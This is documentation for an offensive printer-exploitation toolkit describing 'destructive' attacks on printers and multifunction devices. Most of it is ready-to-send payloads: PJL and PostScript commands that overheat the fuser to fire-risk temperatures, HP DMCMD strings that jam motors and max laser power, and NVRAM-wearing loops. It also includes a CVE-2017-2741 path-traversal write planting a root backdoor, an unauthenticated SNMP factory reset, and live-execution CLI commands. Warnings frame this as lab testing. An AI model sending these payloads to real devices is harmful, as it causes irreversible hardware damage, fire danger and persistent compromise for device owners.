# Destructive Attacks — Irreversible Physical Damage

> **LEGAL WARNING — AUTHORIZED USE ONLY**  
> All attacks documented on this page cause **permanent, irreversible hardware damage** to printers, scanners, and multifunction devices. They are included in PrinterXPL-Forge exclusively for **authorized penetration testing in isolated lab environments**. Operators bear full legal, ethical, and physical safety responsibility. Ensure fire suppression systems are available before any live execution.

---

## Table of Contents

1. [Overview — What Is a Destructive Printer Attack?](#1-overview)
2. [Fuser Thermal Runaway](#2-fuser-thermal-runaway)
3. [Motor Jamming / Mechanical Destruction](#3-motor-jamming)
4. [Laser Scanner / Drum Degradation](#4-laser-scanner-attack)
5. [NVRAM Exhaustion](#5-nvram-exhaustion)
6. [Firmware Bricking](#6-firmware-bricking)
7. [SNMP Factory Reset](#7-snmp-factory-reset)
8. [Destructive Audit Mode — CLI Usage](#8-cli-usage)
9. [Damage Classification Table](#9-damage-table)
10. [Safety Precautions](#10-safety)
11. [References](#11-references)

---

## 1. Overview

Printer security research has historically focused on data theft, lateral movement, and denial of service. However, several attack vectors exist that go beyond software disruption and can cause **permanent physical damage** to the hardware itself.

PrinterXPL-Forge implements three novel physical-damage attack categories (in addition to the existing NVRAM exhaustion, firmware bricking, and factory reset attacks):

| Attack | Physics | Irreversible? | Cost to fix |
|--------|---------|-------------|-------------|
| Fuser Thermal Runaway | Overheat fuser roller assembly | Yes | $50–$800 |
| Motor Jamming | Strip drive-train gears | Yes | $30–$500 |
| Laser Scanner Damage | Burn laser diode / drum | Yes | $100–$2,000 |
| NVRAM Exhaustion | Exhaust NVRAM write cycles | Yes | $50–$400 (NVRAM chip) |
| Firmware Brick | Flash corrupted firmware | Yes | $200+ (depot repair) |
| SNMP Factory Reset | Wipe all configuration | Partial (config only) | Admin time |

---

## 2. Fuser Thermal Runaway

### How it works

The fuser unit fuses toner to paper using a heated roller (ceramic PTC element) and a pressure roller, controlled by a thermistor. The printer firmware maintains temperature via PID control — but **PJL and PostScript commands can override the temperature setpoint directly**.

### PJL Commands (HP, Kyocera)

```
@PJL SET FUSETEMP=270
@PJL DEFAULT FUSETEMP=270
```

For Kyocera (requires service mode unlock):
```
@PJL SET SERVICEMODE=1
@PJL SET FUSER TEMPERATURE=270
```

### PostScript Commands (Ricoh, Xerox, Canon, Generic)

```postscript
<< /FuserTemperature 270 >> setpagedevice
<< /WaitTimeout 9999 >> setpagedevice
<< /FuserMode 2 >> setpagedevice
```

### HP PML DMCMD (Service Manual)

```
@PJL DMCMD ASCIIHEX="0600010B020503FF"  ; heater duty cycle 255 (max)
```

### Damage Timeline

| Temperature | Effect |
|-------------|--------|
| 170–210°C (normal) | Safe operating range |
| 220–240°C | Gradual PTFE sleeve degradation; shortened lifespan |
| 240–270°C | Visible fuser sleeve deformation; roller marks on output |
| 270–285°C | Thermal fuse triggers (irreversible); fuser brick |
| >285°C | Paper residue ignition; fire and smoke |

### Affected Models (Confirmed Accepting PJL FUSETEMP)

- HP LaserJet 4200, 4300, 5000, 9000 series
- Kyocera FS-4100DN, FS-4200DN, ECOSYS P3060dn
- Ricoh Aficio MP 2510, SP 311DNw

### Module

```bash
python src/main.py TARGET --xpl-run research-fuser-thermal-attack
# or via audit:
python src/main.py TARGET --destructive-audit --destructive-modules research-fuser-thermal-attack
```

---

## 3. Motor Jamming / Mechanical Destruction

### How it works

Laser printers use stepper/DC motors for:
- Paper pick-up (tray pickup roller motor)
- Main drive (feed belt / primary drive train)
- Exit (output roller motor)
- Duplex reversal
- Finisher / stapler (MFP models)

HP's PML DMCMD (Printer Management Language — documented in HP service manuals) exposes direct motor activation commands via raw PJL on port 9100.

### HP PML Commands

```
@PJL DMCMD ASCIIHEX="040006020501"   ; main motor ON
@PJL DMCMD ASCIIHEX="040006020503"   ; pickup solenoid ON
@PJL DMCMD ASCIIHEX="040006020504"   ; exit motor ON
```

Sending all three simultaneously causes **mechanical conflict** — the drive train tries to feed paper from tray (pickup), move it through the main path, and eject it — all at once, with no paper actually present. The gears bind and strip.

### PJL Duplex Stress Cycling

```
@PJL DEFAULT DUPLEX=ON
@PJL DEFAULT PAPER=LETTER
@PJL DEFAULT DUPLEX=OFF
@PJL DEFAULT PAPER=LEGAL
[repeat 200–500 times rapidly]
```

Rapid alternation of duplex and page size stresses the duplex reversal mechanism (clutch + solenoid), causing wear and eventual failure.

### Ricoh PJL Extended Motor Test

```
@PJL SET ENGINESEQ=MOTORTEST
@PJL SET MOTORTEST=CONT
@PJL SET MOTORTESTCOUNT=99999
```

### Damage Indicators

- Grinding or clicking sounds during cycling
- "Paper jam" error with no actual paper jam
- Motor stall / paper path obstruction codes
- Permanent gear-strip: motor runs but no paper movement

### Module

```bash
python src/main.py TARGET --xpl-run research-motor-jam-attack
```

---

## 4. Laser Scanner Attack

### How it works

The Laser Scanning Unit (LSU) writes the electrostatic image using:
- **Laser diode** (780nm, 5–10mW typical) — modulated to write dots
- **Polygon mirror** (rotating at 20,000–40,000 RPM) — deflects beam across drum
- **Photosensitive drum** — charged and discharged by laser

**PostScript halftone screen operators** (`setscreen`, `setcolorscreen`) control the laser modulation frequency. Normal screens are 60–150 lpi. Setting them to 9,999 lpi forces the laser to fire at maximum duty cycle continuously.

### PostScript Attack (Mono)

```postscript
%!PS
<< /HWResolution [9600 9600] >> setpagedevice
{ 1 } bind 9999 0 setscreen
0 setgray
clippath fill
showpage
```

### PostScript Attack (Color — CMYK)

```postscript
%!PS
<< /HWResolution [9600 9600] >> setpagedevice
{ 1 } bind dup dup dup
9999 0 9999 0 9999 0 9999 0 setcolorscreen
0 0 0 1 setcmykcolor
clippath fill
showpage
```

### HP PML Direct Laser Power Control

```
@PJL DMCMD ASCIIHEX="0500010C020500FF"   ; laser 1 power = 255 (max, bypasses AGC)
@PJL DMCMD ASCIIHEX="0500010C020501FF"   ; laser 2 power = 255
```

### Drum Exhaustion Mode

Sending 20–50 all-black 1200 DPI pages in rapid succession exhausts the photosensitive drum coating far faster than normal usage.

### Damage Summary

| Component | Normal Lifespan | Under Attack |
|-----------|----------------|-------------|
| Laser diode | ~50,000–100,000 pages | Degraded in minutes |
| Polygon mirror motor | 5–10 years | Bearing failure from overspeed |
| Photosensitive drum | 20,000–100,000 pages | Coating ablation in minutes |

### Module

```bash
python src/main.py TARGET --xpl-run research-laser-scanner-attack
```

---

## 5. NVRAM Exhaustion

*Original research: BlackHat USA 2017 (Müller et al.). Confirmed on ~20 models.*

NVRAM chips used in printers (typically 93C46/93C56 SPI EEPROM or similar) have a write endurance of approximately **100,000–200,000 write cycles**. PJL `DEFAULT` and `SET` commands trigger NVRAM writes for each persistent setting change.

```
@PJL DEFAULT COPIES=1    ; each invocation = 1 NVRAM write cycle
```

Brother-specific (most efficient — alternates a single bit):
```
@PJL DEFAULT COLLATE=ON
@PJL DEFAULT COLLATE=OFF
```

Running in a tight loop for hours exhausts the NVRAM. Affected settings become read-only, then the firmware enters a failure state (boot loop / brick).

**Modules:** `research-pjl-nvram-damage`, `research-brother-nvram`, `research-generic-pjl-nvram`

---

## 6. Firmware Bricking

### Xerox DLM (Dynamic Loadable Module)

```
@PJL DLM START
[DLM binary payload]
```

Sending a corrupted or malicious DLM image via PJL activates Xerox's firmware download manager, overwriting executable regions of the flash. If the DLM is invalid, the device enters a permanent recovery loop.

**Modules:** `research-xerox-pjl-dlm`, `research-xerox-firmware-root`

### HP PJL Path Traversal (CVE-2017-2741)

```
@PJL FSDOWNLOAD FORMAT:BINARY SIZE=<n> NAME="/etc/profile.d/backdoor.sh"
[shell payload]
```

Followed by an SNMP-triggered restart that executes the planted script at boot, creating a persistent root backdoor.

**Module:** `edb-45273`

---

## 7. SNMP Factory Reset

```
snmpset -v2c -c public TARGET_IP 1.3.6.1.2.1.43.5.1.1.3.1 i 6
```

OID `prtGeneralReset` value `6` = factory reset on most MFPs. No authentication required with default community strings.

**Effects:** All configuration wiped (SMTP, LDAP, admin passwords, stored jobs, address book). Hardware is physically unharmed but requires full reconfiguration.

**Module:** `research-snmp-factory-reset`

---

## 8. CLI Usage

### Assess Mode (Safe — No Payloads Sent)

```bash
python src/main.py 192.168.1.100 --destructive-audit
```

Checks all 10 destructive modules:
1. Port connectivity (TCP 9100, UDP 161, TCP 80)
2. PJL probe for fuser/motor/laser variable access
3. Vulnerability assessment
4. Detailed evidence output per module
5. Summary: vulnerable / not_vulnerable / errors

### Selective Modules

```bash
python src/main.py 192.168.1.100 --destructive-audit \
  --destructive-modules research-fuser-thermal-attack,research-brother-nvram
```

### Custom Ports

```bash
python src/main.py 192.168.1.100 --destructive-audit \
  --port-raw 3910 --port-snmp 162 --port-http 8080
```

### Live Execution (AUTHORIZED LAB ONLY)

```bash
python src/main.py 192.168.1.100 --destructive-audit --no-dry
```

> **Requires explicit written authorization. Hardware damage is PERMANENT.**

### Interactive Menu

```bash
python src/main.py
# → choose [D] DESTRUCTIVE AUDIT
# → select modules (or 0 for all)
# → choose DRY-RUN or LIVE
# → confirm authorization
```

### Running Individual Modules

```bash
# Fuser thermal attack — assess
python src/main.py 192.168.1.100 --xpl-run research-fuser-thermal-attack

# Fuser thermal — live (HP, 270°C)
python src/main.py 192.168.1.100 --xpl-run research-fuser-thermal-attack --no-dry

# Motor jamming — duplex stress mode
python src/main.py 192.168.1.100 --xpl-run research-motor-jam-attack --no-dry

# Laser scanner — drum exhaustion (20 all-black pages)
python src/main.py 192.168.1.100 --xpl-run research-laser-scanner-attack --no-dry
```

---

## 9. Damage Classification Table

| Module | Damage Class | Reversible? | Repair Cost | Affected Vendors |
|--------|-------------|-------------|-------------|-----------------|
| `research-fuser-thermal-attack` | Physical / Fire | **Never** | $50–$800 | HP, Kyocera, Ricoh, Xerox |
| `research-motor-jam-attack` | Physical / Mechanical | **Never** | $30–$500 | HP, Ricoh, Generic |
| `research-laser-scanner-attack` | Physical / Optical | **Never** | $100–$2,000 | HP, Xerox, Ricoh, Canon |
| `research-pjl-nvram-damage` | NVRAM Wear | **Never** | $50–$400 | HP, Konica, Lexmark |
| `research-brother-nvram` | NVRAM Wear | **Never** | $50–$200 | Brother |
| `research-generic-pjl-nvram` | NVRAM Risk | Partial | $50–$200 | HP, Dell, Generic |
| `research-snmp-factory-reset` | Config Wipe | Yes (config) | Admin time | Multi-vendor |
| `research-xerox-pjl-dlm` | Firmware Brick | **Never** | $200+ | Xerox |
| `research-xerox-firmware-root` | Firmware Root/Brick | **Never** | $200+ | Xerox |
| `edb-45273` (CVE-2017-2741) | Firmware Root | No (without re-flash) | $200+ | HP PageWide/OfficeJet |

---

## 10. Safety Precautions

Before running any live destructive attack in a lab:

1. **Written authorization** — Obtain explicit written permission from the asset owner.
2. **Isolated network** — Ensure the target device is on an isolated VLAN or physically isolated network. No production devices.
3. **Fire safety** — Have a CO₂ fire extinguisher nearby when testing fuser thermal attacks. Do not leave the device unattended.
4. **Eye protection** — During laser scanner testing, never look directly into any optical port of the printer.
5. **Ventilation** — Overheating printers can release toner fumes (carbon black, VOCs). Work in a well-ventilated room.
6. **Device decommissioning** — After destructive tests, the device should be considered permanently decommissioned and disposed of properly.
7. **Documentation** — Log all tests with timestamps, payloads, and observations for the security report.

---

## 11. References

1. Müller, J. et al. — "Exploiting Network Printers", BlackHat USA 2017  
   https://blackhat.com/docs/us-17/thursday/us-17-Mueller-Exploiting-Network-Printers.pdf

2. Hacking Printers Wiki — Physical Damage  
   http://hacking-printers.net/wiki/index.php/Physical_damage

3. Cui, A. et al. — "Firmware Attacks on Embedded Systems", USENIX 2011  
   https://www.usenix.org/legacy/events/sec11/tech/full_papers/Cui.pdf

4. Adobe — PostScript Language Reference Manual (3rd ed.)  
   https://www.adobe.com/content/dam/acom/en/devnet/postscript/pdfs/PLRM.pdf

5. HP — LaserJet 4200/4300 Service Manual (fuser + motor DMCMD commands)

6. Kyocera — FS-4100DN/4200DN Field Service Manual (fuser temperature service mode)

7. RFC 3805 — Printer MIB v2 (SNMP prtGeneralReset OID)  
   https://datatracker.ietf.org/doc/html/rfc3805

8. CVE-2017-2741 — HP PageWide Pro Persistent Root via PJL  
   https://nvd.nist.gov/vuln/detail/CVE-2017-2741

---

*Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek*
